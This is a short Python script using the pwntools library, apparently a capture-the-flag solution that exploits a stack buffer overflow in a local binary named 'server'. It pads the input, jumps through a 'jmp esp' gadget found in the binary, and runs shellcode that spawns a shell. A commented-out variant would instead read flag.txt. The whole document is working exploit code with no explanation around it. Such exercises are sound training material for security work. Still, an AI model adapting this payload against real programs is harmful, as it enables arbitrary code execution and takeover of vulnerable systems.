from pwn import *


gdbscript = '''
init-pwndebug
continue
'''.format(**locals())

exe = './server'
elf = context.binary = ELF(exe,checksec=False)
context.log_level = 'debug'


io = process('./server')
padding = 76

jmp_esp = asm("jmp esp")
jmp_esp = next(elf.search(jmp_esp))

#shellcode = asm(shellcraft.cat('flag.txt'))
shellcode=asm(shellcraft.sh())


shellcode += asm(shellcraft.exit())

payload = flat(
	'a' * padding,
	jmp_esp,
	'a' * 16,
	shellcode
	)

write("payload",payload)

io.sendlineafter(b':',payload)
io.interactive()